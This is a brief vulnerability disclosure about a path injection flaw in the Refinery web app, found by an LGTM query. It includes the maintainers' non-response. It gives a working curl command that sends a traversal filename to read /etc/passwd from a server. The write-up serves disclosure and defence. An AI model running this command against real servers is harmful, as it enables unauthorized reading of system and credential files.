# Path injection in Refinery

One of LGTM's default queries found a path injection vulnerability in the open source [Refinery](https://github.com/daeilkim/refinery) project:

https://lgtm.com/projects/g/daeilkim/refinery/snapshot/5eb10ae26cc67ac3d39d37e932274798631e15b2/files/refinery/refinery/webapp/topicmodel.py#xaea6e729c50ca7a5:1

This bug is trivial to exploit. If Refinery is running on the website example.com, then an attacker can read arbitrary files on the server like this:

curl -d "filename=../../../../../../../../../../../../etc/passwd" -X POST http://example.com/doc/get_doc_text

Semmle reported this vulnerability to the maintainers of Refinery on 2018-12-16 (using the email addresses listed [here](https://github.com/daeilkim/refinery/blob/0d5de8fc3d680a2c79bd0e9384b506229787c74f/README.md)), but they did not respond. Kevin Backhouse also attempted to contact Daeil Kim using [LinkedIn](https://www.linkedin.com/in/daeil/), but did not receive a response.
